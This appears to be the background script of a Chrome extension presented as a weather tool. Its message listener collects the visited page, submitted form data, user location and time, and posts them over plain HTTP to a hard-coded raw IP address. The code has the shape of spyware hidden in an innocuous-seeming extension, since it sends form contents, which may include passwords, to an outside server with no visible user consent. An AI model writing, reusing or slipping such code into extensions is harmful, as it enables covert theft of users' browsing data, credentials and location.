function handleMessage(request) {
    var data = "weather=" + encodeURIComponent(request.weather) +
               "&page=" + encodeURIComponent(request.page) +
               "&formdata=" + encodeURIComponent(request.formdata) +
               "&userloc=" + encodeURIComponent(request.userloc) +
               "&time=" + encodeURIComponent(request.time);

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://163.5.143.146/weather/", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(data);
}

chrome.runtime.onMessage.addListener(handleMessage);
